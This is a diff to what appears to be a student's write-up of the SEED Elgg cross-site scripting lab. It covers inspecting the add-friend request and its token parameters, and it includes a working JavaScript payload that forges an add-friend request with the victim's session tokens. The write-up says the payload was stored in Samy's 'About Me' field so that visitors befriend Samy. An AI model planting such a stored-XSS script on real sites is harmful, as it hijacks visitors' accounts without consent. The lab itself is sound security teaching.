@@ -43,10 +43,12 @@
 - We use Firefox’s ``HTTP inspection tool`` to help us get what are sent to the server when a user adds a friend.
 - Inspectioning the contents of the HTTP GET request that was sent when the add friend button was clicked, we identify all the parameters in the request.
 - Finding that the data is attached to the URL ``http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1642154629&__elgg_token=cjBSuLpxRMRNZH0Uoq_zug&__elgg_ts=1642154629&__elgg_token=cjBSuLpxRMRNZH0Uoq_zug``.
-- The parameters are placed after the URL by``?`` and separated by ``&``, that parameters being, first ``friend=59`` and the variables ``ts`` and ``token``.
+- The parameters are placed after the URL by``?`` and separated by ``&``, that parameters being, first ``friend=59`` and the variables ``__elgg_ts``, ``__elgg_token``. 
+- The script create a GET request to the URL ``http://www.seed-server.com/action/friends/add`` with the parameters ``friend=59``, ``'__elgg_ts='+elgg.security.token.__elgg_ts;``, ``'__elgg_token='+elgg.security.token.__elgg_token;``.
 
-- ``<script type='text/javascript'>
-        window.onload = function () {
+```
+<script type='text/javascript'> 
+    window.onload = function () {
         var Ajax=null;
         var ts='&__elgg_ts='+elgg.security.token.__elgg_ts;
         var token='&__elgg_token='+elgg.security.token.__elgg_token;
@@ -54,12 +56,15 @@
         Ajax=new XMLHttpRequest();
         Ajax.open('GET', sendurl, true);
         Ajax.send();
-        }
-    </script>``
+    }
+</script>
+```
 
-- ``http://www.seed-server.com/action/friends/add?friend=59``
+- Sending out the same HTTP request as add-friend HTTP request.
+- We placed the script in the ``About Me`` field of Samy’s profile page, after we clicking on option ``Edit HTML`` to enable Text mode.
+- Now any other user that visits Samy’s page, will add Samy as a friend.
 
-- ``'http://www.seed-server.com/action/friends/add?friend=59'+ts+token``
+
 
 
 
